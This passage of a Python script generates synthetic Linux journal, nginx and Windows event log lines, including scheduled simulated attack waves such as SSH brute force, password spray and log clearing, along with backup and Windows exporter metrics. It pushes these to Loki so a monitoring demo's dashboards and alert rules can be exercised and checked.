        return (f'{ts:%Y/%m/%d %H:%M:%S} [error] {pid}#{pid}: *{rng.randint(1, 999)} open() '
                f'"/var/www/html{rng.choice(PATHS)}" failed (2: No such file or directory), client: {ip}, '
                f'server: _, request: "GET {rng.choice(PATHS)} HTTP/1.1", host: "demo.local"')
    raise SystemExit(f"no demo template for linux job {job!r}; extend linux_line()")

# ------------------------------------------------------------ journal messages
# loki.source.journal delivers the bare MESSAGE field. Each template is one shape that
# the dashboards and alerts match on. build() emits --per-journal lines of every
# template, so coverage does not depend on random choice.

IPV6_ATTACKER = "2001:db8::50"


def journal_failed(rng: random.Random) -> str:
    who = rng.choice([rng.choice(USERS)[0], "invalid user bob"])
    return f"Failed password for {who} from {rng.choice(ATTACKER_IPS)} port {rng.randint(40000, 65000)} ssh2"


def journal_failed_key(rng: random.Random) -> str:
    return (f"Failed publickey for {rng.choice(USERS)[0]} from {rng.choice(ATTACKER_IPS)} "
            f"port {rng.randint(40000, 65000)} ssh2")


def journal_invalid(rng: random.Random) -> str:
    return f"Invalid user admin from {rng.choice(ATTACKER_IPS)} port {rng.randint(40000, 65000)}"


def journal_accepted(rng: random.Random) -> str:
    method = rng.choice(["publickey", "password"])
    return (f"Accepted {method} for {rng.choice(USERS)[0]} from {rng.choice(INTERNAL_IPS)} "
            f"port {rng.randint(40000, 65000)} ssh2")


def journal_sudo(rng: random.Random) -> str:
    user = rng.choice(USERS)[0]
    return f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/id"


def journal_cron(rng: random.Random) -> str:
    return "(root) CMD (/usr/bin/true)"


def journal_useradd(rng: random.Random) -> str:
    return f"new user: name={rng.choice(['demo', 'intern'])}, UID=1001, GID=1001, home=/home/demo, shell=/bin/bash"


def journal_pam(rng: random.Random) -> str:
    return (f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
            f"rhost={rng.choice(ATTACKER_IPS + [IPV6_ATTACKER])} user={rng.choice(USERS)[0]}")


def journal_segfault(rng: random.Random) -> str:
    return f"demo-app[{rng.randint(1000, 60000)}]: segfault at 0 ip 00007f3a2c1d0b2e sp 00007ffd1 error 4"


JOURNAL_TEMPLATES = [journal_failed, journal_failed_key, journal_invalid, journal_accepted,
                     journal_sudo, journal_cron, journal_useradd, journal_pam, journal_segfault]


# ------------------------------------------------------------- scenario waves

# Events the alert rules react to. The steady feed leaves them out; a wave pushes them
# in one burst, so alerts fire after a wave and resolve in between, as in real life.
WAVE_IDS = {1102, 4720, 4732, 4728, 4756, 7045, 4698, 5136, 5137, 5141, 4625, 4740, 5001, 4104}
WAVE_JOURNAL = {journal_failed, journal_failed_key, journal_invalid, journal_pam, journal_useradd, journal_sudo}
SCENARIOS = ("spray", "admin", "persistence", "ad", "logclear", "ssh", "all")


def wave(hosts: list[Host], rng: random.Random, now: datetime, scenario: str = "all") -> dict:
    """One attack wave. Every line keeps the production shape and labels."""
    streams: dict[tuple, list] = {}
    pick = {
        "spray": {4625: 25, 4740: 1},
        "admin": {4720: 1, 4732: 1, 4728: 1},
        "persistence": {7045: 1, 4698: 1, 4104: 2},
        "ad": {5136: 2, 5137: 1, 5141: 1},
        "logclear": {1102: 1},
    }
    wanted: dict[int, int] = {}
    for name, ids in pick.items():
        if scenario in (name, "all"):
            wanted.update(ids)

    def add(labels: dict, ts: datetime, line: str):
        streams.setdefault(tuple(sorted(labels.items())), []).append((ts, line))

    for host in hosts:
        for src in host.sources:
            if src.kind == "windowsevent":
                for eid, tpl in win_targets(src):
                    for i in range(wanted.get(eid, 0)):
                        ts = now - timedelta(seconds=i * 2 + rng.random())
                        host.record_seq += 1
                        line = windows_line(host.name, src.channel, eid, tpl, ts, host.record_seq, rng)
                        add(stage_labels(src.labels, src.stages, line), ts, line)
            elif src.kind == "journal" and scenario in ("ssh", "all"):
                burst = [journal_failed] * 15 + [journal_invalid] * 5 + [journal_pam] * 5 + [journal_sudo] * 6
                burst += [journal_useradd]
                for i, tpl in enumerate(burst):
                    ts = now - timedelta(seconds=i + rng.random())
                    line = tpl(rng)
                    add(stage_labels(src.labels, src.stages, line), ts, line)
    for key in streams:
        streams[key].sort(key=lambda e: e[0])
    return streams


# ------------------------------------------------------------ posture metrics

def write_posture(prom_dir: Path, now: datetime) -> None:
    """Backup metrics in the names posture/backup scripts write for the node_exporter textfile
    collector: one host healthy, one with a stale backup and an overdue restore test."""
    t = int(now.timestamp())
    hosts = {"DEMO-SRV01": (t - 2 * 3600, t - 10 * 86400), "DEMO-LNX01": (t - 3 * 86400, t - 120 * 86400)}
    body = ["# HELP backup_last_success_timestamp_seconds Unix time of the last successful backup run.",
            "# TYPE backup_last_success_timestamp_seconds gauge"]
    body += [f'backup_last_success_timestamp_seconds{{job="restic",host="{h}"}} {b}' for h, (b, _) in hosts.items()]
    body += ["# HELP backup_last_restore_test_timestamp_seconds Unix time of the last successful restore test.",
             "# TYPE backup_last_restore_test_timestamp_seconds gauge"]
    body += [f'backup_last_restore_test_timestamp_seconds{{job="restic",host="{h}"}} {r}' for h, (_, r) in hosts.items()]
    prom_dir.mkdir(parents=True, exist_ok=True)
    tmp = prom_dir / ".demo_backup.prom.tmp"
    tmp.write_text("\n".join(body) + "\n", encoding="utf-8")
    tmp.replace(prom_dir / "demo_backup.prom")


# ------------------------------------------------------ Windows stand-in metrics

START = time.time()


def write_windows_metrics(prom_dir: Path) -> None:
    """windows_exporter-shaped metrics for one demo Windows host (DEMO-WS01): counters grow with
    time so rate() works; the Defender service is stopped, so WindowsDefenderDisabled fires."""
    up = time.time() - START
    lines = []
    def g(name: str, labels: str, value: float, kind: str = "gauge"):
        if not any(l.startswith(f"# TYPE {name} ") for l in lines):
            lines.append(f"# TYPE {name} {kind}")
        lines.append(f"{name}{{{labels}}} {value:.0f}")
    for core in ("0,0", "0,1"):
        for mode, share in (("idle", 0.78), ("user", 0.15), ("privileged", 0.07)):
            g("windows_cpu_time_total", f'core="{core}",mode="{mode}"', 1e6 + up * share, "counter")
    g("windows_memory_physical_total_bytes", "", 16 * 2**30)
    g("windows_memory_physical_free_bytes", "", (6.5 + (up % 600) / 600) * 2**30)
    g("windows_logical_disk_size_bytes", 'volume="C:"', 256 * 2**30)
    g("windows_logical_disk_free_bytes", 'volume="C:"', 41 * 2**30)
    g("windows_net_bytes_received_total", 'nic="Ethernet"', 5e9 + up * 180_000, "counter")
    g("windows_net_bytes_sent_total", 'nic="Ethernet"', 2e9 + up * 60_000, "counter")
    for svc, running in (("WinDefend", 0), ("mpssvc", 1), ("EventLog", 1), ("wuauserv", 1), ("Dnscache", 1)):
        g("windows_service_state", f'name="{svc}",state="running"', running)
        g("windows_service_state", f'name="{svc}",state="stopped"', 1 - running)
    prom_dir.mkdir(parents=True, exist_ok=True)
    tmp = prom_dir / ".demo_windows.prom.tmp"
    tmp.write_text("\n".join(l.replace("{}", "") for l in lines) + "\n", encoding="utf-8")
    tmp.replace(prom_dir / "demo_windows.prom")


# ------------------------------------------------------ stages, build, outputs

def stage_labels(labels: dict, stages: list[Stage], line: str) -> dict:
    """Run the loki.process stages on a line; extracted values join the stream labels."""
    out = dict(labels)
    groups: dict = {}
    for st in stages:
        if st.kind == "regex":
            m = re.search(st.expression, line)
            groups = m.groupdict() if m else {}
        elif st.kind == "static":
            out.update(st.labels)
        else:
            for label, group in st.labels.items():
                value = groups.get(group)
                if value:
                    out[label] = value
    return out


def ns(ts: datetime) -> int:
    return int(ts.timestamp()) * 1_000_000_000 + ts.microsecond * 1000


def build(hosts: list[Host], rng: random.Random, now: datetime, span_s: float, per_id: int,
          per_file: int, per_journal: int, calm: bool = False) -> tuple[dict, dict]:
    """calm=True leaves out the events that alert rules react to; waves add them on schedule."""
    streams: dict[tuple, list] = {}
    cover: dict[tuple, dict] = {}

    def add(labels: dict, ts: datetime, line: str):
        streams.setdefault(tuple(sorted(labels.items())), []).append((ts, line))

    for host in hosts:
        for src in host.sources:
            if src.kind == "windowsevent":
                cov = cover.setdefault((host.name, src.name), {"ids": set(), "levels": set()})
                for eid, tpl in win_targets(src):
                    if calm and eid in WAVE_IDS:
                        continue
                    cov["ids"].add(eid)
                    cov["levels"].add(tpl.level)
                    for _ in range(per_id):
                        ts = now - timedelta(seconds=rng.random() * span_s)
                        host.record_seq += 1
                        line = windows_line(host.name, src.channel, eid, tpl, ts, host.record_seq, rng)
                        add(stage_labels(src.labels, src.stages, line), ts, line)
            elif src.kind == "journal":
                for tpl in JOURNAL_TEMPLATES:
                    if calm and tpl in WAVE_JOURNAL:
                        continue
                    for _ in range(per_journal):
                        ts = now - timedelta(seconds=rng.random() * span_s)
                        line = tpl(rng)
                        add(stage_labels(src.labels, src.stages, line), ts, line)
            else:
                for path, labels in src.files:
                    if calm and labels.get("job") in ("auth", "secure"):
                        continue  # auth files carry failures and sudo; waves add them
                    for _ in range(per_file):
                        ts = now - timedelta(seconds=rng.random() * span_s)
                        line = linux_line(labels["job"], host.name, path, ts, rng)
                        add(stage_labels({**labels, "filename": path}, src.stages, line), ts, line)
    for key in streams:
        streams[key].sort(key=lambda e: e[0])
    return streams, cover


def check(hosts: list[Host], streams: dict, cover: dict) -> int:
    problems: list[str] = []
    order = {k: i for i, k in enumerate(CANON)}
    for host in hosts:
        for src in host.sources:
            if src.kind != "windowsevent":
                continue
            ids = {int(x) for x in re.findall(r"EventID\s*=\s*(\d+)", src.xpath)}
            levels = {int(x) for x in re.findall(r"Level\s*=\s*(\d+)", src.xpath)}
            cov = cover.get((host.name, src.name), {"ids": set(), "levels": set()})
            for eid in sorted(ids - cov["ids"]):
                problems.append(f"{host.name}/{src.name}: EventID {eid} has no line")
            if levels and not (levels & cov["levels"]):
                problems.append(f"{host.name}/{src.name}: no line with Level in {sorted(levels)}")
            if not ids and not levels and not cov["ids"]:
                problems.append(f"{host.name}/{src.name}: any-event sample missing")

    for host in hosts:
        for src in host.sources:
            if src.kind == "journal" and not any(dict(k).get("instance") == host.name for k in streams):
                problems.append(f"{host.name}/{src.name}: no journal stream with instance {host.name}")

    lines = 0
    for key, entries in streams.items():
        labels = dict(key)
        required = (("job", "instance", "source") if labels.get("job") == "systemd-journal"
                    else ("job", "host", "os_type", "category", "severity"))
        for col in required:
            if col not in labels:
                problems.append(f"{labels.get('job', '?')}: stream without label {col}")
        if "action" in labels and labels["action"] not in ("Ban", "Unban"):
            problems.append(f"{labels}: bad action label")
        for _, line in entries:
            lines += 1
            if not line.startswith("{"):
                continue
            obj = json.loads(line)
            keys = [k for k in obj]
            idx = [order.get(k, -1) for k in keys]
            if -1 in idx or idx != sorted(idx):
                problems.append(f"key order differs from formatLine: {keys}")
            if encode(obj) != line:
                problems.append(f"encoding differs from jsoniter: {line[:120]}")
            if not isinstance(obj.get("event_id"), int):
                problems.append("event_id is not an int")

    streams_n = len(streams)
    if problems:
        for p in sorted(set(problems))[:40]:
            print("FAIL", p)
        print(f"check failed: {len(set(problems))} problem(s)")
        return 1
    print(f"check ok: {streams_n} streams, {lines} lines, every xpath EventID and Level covered")
    return 0


def write_dump(path: Path, streams: dict) -> None:
    with path.open("w", encoding="utf-8") as f:
        for key, entries in streams.items():
            labels = dict(key)
            for ts, line in entries:
                f.write(json.dumps({"stream": labels, "ts": str(ns(ts)), "line": line},
                                   ensure_ascii=False) + "\n")


def push(base: str, streams: dict, batch: int = 1000) -> int:
    url = base.rstrip("/") + "/loki/api/v1/push"
    sent = 0
    for key, entries in streams.items():
        labels = dict(key)
        for i in range(0, len(entries), batch):
            values = [[str(ns(ts)), line] for ts, line in entries[i : i + batch]]
            body = json.dumps({"streams": [{"stream": labels, "values": values}]}).encode("utf-8")
            req = urllib.request.Request(url, data=body, method="POST",
                                         headers={"Content-Type": "application/json"})
            try:
                with urllib.request.urlopen(req, timeout=60) as resp:
                    resp.read()
            except urllib.error.HTTPError as e:
                detail = e.read().decode(errors="replace")
                if e.code == 400 and "too far behind" in detail:
                    continue  # a restart re-sends the backfill; Loki keeps what it already has
                raise SystemExit(f"loki push failed for {labels}: {e.code} {detail}")
            sent += len(values)
    return sent


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--repo", type=Path, default=REPO, help="repo root with the Alloy configs")
    ap.add_argument("--check", action="store_true", help="validate parsing and coverage (default action)")
    ap.add_argument("--dump", type=Path, help="write NDJSON {stream, ts, line}")
    ap.add_argument("--loki", help="Loki base URL, e.g. http://127.0.0.1:3100")
    ap.add_argument("--span-hours", type=float, default=24.0, help="backfill window")
    ap.add_argument("--per-id", type=int, default=4, help="lines per Windows EventID target")
    ap.add_argument("--per-file", type=int, default=40, help="lines per Linux file target")
    ap.add_argument("--per-journal", type=int, default=10, help="lines per journal message template")
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--follow", type=float, metavar="SECONDS", help="keep pushing calm traffic every SECONDS")
    ap.add_argument("--wave-minutes", type=float, default=15.0, help="with --follow: attack wave interval")
    ap.add_argument("--scenario", choices=SCENARIOS, help="push one attack wave now and exit")
    ap.add_argument("--prom-dir", type=Path, help="write demo backup metrics for the textfile collector")
    ap.add_argument("--win-prom-dir", type=Path, help="write windows_exporter-shaped metrics for a demo host")
    args = ap.parse_args()

    rng = random.Random(args.seed)
    hosts = load_hosts(args.repo)
    now = datetime.now(timezone.utc)

    if args.scenario:
        if not args.loki:
            raise SystemExit("--scenario needs --loki")
        print(f"wave {args.scenario}: {push(args.loki, wave(hosts, rng, now, args.scenario))} lines")
        return 0

    streams, cover = build(hosts, rng, now, args.span_hours * 3600, args.per_id, args.per_file, args.per_journal)
    if not (args.dump or args.loki or args.follow or args.prom_dir or args.win_prom_dir):
        return check(hosts, streams, cover)
    if args.prom_dir:
        write_posture(args.prom_dir, now)
        print(f"posture metrics: {args.prom_dir / 'demo_backup.prom'}")
    if args.win_prom_dir:
        write_windows_metrics(args.win_prom_dir)
    if args.dump:
        write_dump(args.dump, streams)
        print(f"dump ok: {args.dump}")
    if args.loki:
        print(f"backfill pushed: {push(args.loki, streams)} lines", flush=True)
    if args.follow:
        if not args.loki:
            raise SystemExit("--follow needs --loki")
        print(f"wave all: {push(args.loki, wave(hosts, rng, datetime.now(timezone.utc)))} lines", flush=True)
        next_wave = time.monotonic() + args.wave_minutes * 60
        while True:
            time.sleep(args.follow)
            now = datetime.now(timezone.utc)
            live, _ = build(hosts, rng, now, 0, 1, 1, 1, calm=True)
            push(args.loki, live)
            if args.prom_dir:
                write_posture(args.prom_dir, now)
            if args.win_prom_dir:
                write_windows_metrics(args.win_prom_dir)
            if time.monotonic() >= next_wave:
                print(f"wave all: {push(args.loki, wave(hosts, rng, now))} lines", flush=True)
                next_wave = time.monotonic() + args.wave_minutes * 60
    return 0


if __name__ == "__main__":
    sys.exit(main())
